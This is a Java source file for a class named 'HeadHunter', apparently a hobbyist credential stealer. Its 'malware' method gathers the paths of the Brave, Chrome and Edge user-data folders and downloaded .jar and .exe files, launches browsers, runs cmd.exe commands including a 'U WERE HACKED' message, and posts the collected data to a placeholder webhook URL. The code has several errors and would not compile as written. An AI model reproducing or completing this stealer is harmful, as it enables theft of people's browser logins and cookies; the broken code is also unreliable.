import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class HeadHunter {
	
    void malware(String url) {
        char filename;
        int file;
        List<String> files = new ArrayList<String>();
        String brave_data = System.getenv("LOCALAPPDATA") + "/BraveSoftware/Brave-Browser/User Data";
        String chrome_data = System.getenv("LOCALAPPDATA") + "/Google/Chrome/user Data";
        String edge_data = System.getenv("LOCALAPPDATA") + "/Microsoft/Edge/User Data";
        String jarfile = System.getenv("DOWNLOADS") + filename + ".jar";
        String exefile = System.getenv("DOWNLOADS") + filename + ".exe";
        files.add(brave_data);
        files.add(chrome_data);
        files.add(edge_data);
        files.add(jarfile);
        files.add(exefile);
        
        for (String m : files) {
        	try {
                Runtime.getRuntime().exec("Chrome.exe");
                Runtime.getRuntime().exec("Brave Browser.exe");
                Runtime.getRuntime().exec("cmd.exe /c tree");
                Runtime.getRuntime().exec("cmd.exe /c echo U WERE HACKED BY HeadHunter RAYT!");
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
            	String ip = InetAddress.getLocalHost().getHostAddress();
            } catch (UnknownHostException e) {
            	e.printStackTrace();
            }
        }
        this.send(files);
    }

    public void send(ArrayList<String> files) {
    	for (String m1 : files) {
    		try {
        		HttpURLConnection webhook = (HttpURLConnection) new URL("webhook here").openConnection();
        		try {
        			webhook.getOutputStream().write(Arrays.asList(files));
        		} catch (IOException e2) {
        			e2.printStackTrace();
        		}
            } catch (IOException e1) {
            	e1.printStackTrace();
            }
    	}
    }

}